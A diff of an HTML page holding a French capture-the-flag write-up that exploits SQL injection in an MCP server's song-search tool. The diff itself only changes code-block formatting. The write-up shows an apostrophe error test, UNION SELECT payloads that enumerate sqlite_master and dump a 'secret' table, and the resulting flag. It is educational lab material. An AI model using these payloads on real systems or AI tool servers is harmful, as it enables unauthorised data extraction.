@@ -1900,7 +1900,19 @@ Objectif : détourner ce moteur de recherche pour obtenir le flag caché dans la
 <h2 id="1-reconnaissance">1. Reconnaissance</h2>
 <p>Comme dans le challenge précédent, on peut se connecter au serveur MCP avec un client FastMCP.
 En listant les tools, on découvre :</p>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JSON</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">{</span>
 <span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;search_song_by_title&quot;</span><span class="p">,</span>
 <span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
 <span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Search rai song by title&quot;</span><span class="p">,</span>
@@ -1913,22 +1925,26 @@ En listant les tools, on découvre :</p>
 <span class="w">        </span><span class="p">},</span>
 <span class="w">    </span><span class="err">...</span>
 <span class="p">}</span>
-</code></pre></div>
+</code></pre></div></td></tr></table></div>
 <p>Le serveur expose un seul tool : <code>search_song_by_title(title: str)</code>. Il nous permet de chercher des chansons à partir du titre:</p>
-<div class="highlight"><pre><span></span><code><span class="n">result</span> <span class="o">=</span> <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">call_tool</span><span class="p">(</span><span class="s2">&quot;search_song_by_title&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;el&quot;</span><span class="p">})</span>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">result</span> <span class="o">=</span> <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">call_tool</span><span class="p">(</span><span class="s2">&quot;search_song_by_title&quot;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;el&quot;</span><span class="p">})</span>
 <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Result:</span><span class="se">\n</span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">structured_content</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</code></pre></div>
-<div class="highlight"><pre><span></span><code>Result:
+</code></pre></div></td></tr></table></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>Result:
 Cheb Mami - Meli Meli
 Cheb Hasni - El Visa
 Faudel - Tellement NBR
-</code></pre></div>
+</code></pre></div></td></tr></table></div>
 <hr />
 <h2 id="2-exploitation-etapes-du-sqli">2. Exploitation - étapes du SQLi</h2>
 <h3 id="a-test-de-linjection">a) Test de l'injection</h3>
 <p>On commence classiquement par injecter un simple <strong>apostrophe <code>'</code></strong> :</p>
-<div class="highlight"><pre><span></span><code>Error !
-</code></pre></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>Error !
+</code></pre></div></td></tr></table></div>
 <p>Cela provoque une erreur, confirmant que notre entrée n'est peut-être pas nettoyée !</p>
 <hr />
 <h3 id="b-enumeration-des-colonnes">b) Enumération des colonnes</h3>
@@ -1941,29 +1957,38 @@ Faudel - Tellement NBR
 <hr />
 <h3 id="c-decouverte-du-schema-de-la-base">c) Découverte du schéma de la base</h3>
 <p>On utilise la table interne de SQLite <code>sqlite_master</code> pour lister les tables présentes dans la DB:</p>
-<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT name, sql FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
-</code></pre></div>
-<div class="highlight"><pre><span></span><code>Result:
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="s1">&#39; UNION SELECT name, sql FROM sqlite_master WHERE type=&#39;</span><span class="k">table</span><span class="err">&#39;</span><span class="w"> </span><span class="c1">--</span>
+</code></pre></div></td></tr></table></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>Result:
 Cheb Bilal - Ghorba
 ...
 Faudel - Tellement NBR
 secret - CREATE TABLE secret (flag TEXT)
 songs - CREATE TABLE songs (id INTEGER PRIMARY KEY, artist TEXT, title TEXT)
-</code></pre></div>
+</code></pre></div></td></tr></table></div>
 <p>On voit deux tables: <code>songs</code> et <code>secret</code>. Et cette dernière contient une colonne <code>flag</code> !</p>
 <hr />
 <h3 id="d-recuperation-du-flag">d) Récupération du flag</h3>
 <p>On lance alors une union select pour extraire la colonne <code>flag</code> :</p>
-<div class="highlight"><pre><span></span><code><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="c1">--</span>
-</code></pre></div>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="c1">--</span>
+</code></pre></div></td></tr></table></div>
 <p>On sélectionne 2 fois <code>flag</code> pour avoir une union valide.</p>
 <p>Résultat :</p>
-<div class="highlight"><pre><span></span><code>Result:
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>Result:
 Cheb Bilal - Ghorba
 ...
 Faudel - Tellement NBR
 flag-rai_n3v3r_d135-Yj60e72N - flag-rai_n3v3r_d135-Yj60e72N
-</code></pre></div>
+</code></pre></div></td></tr></table></div>
 <h2 id="script-complet">Script complet</h2>
 <p><a href="solution.py">Le script complet est ici</a>.</p>
 <h2 id="flag">Flag</h2>
@@ -2075,7 +2100,7 @@ flag-rai_n3v3r_d135-Yj60e72N - flag-rai_n3v3r_d135-Yj60e72N
     
     
       
-      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.indexes"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
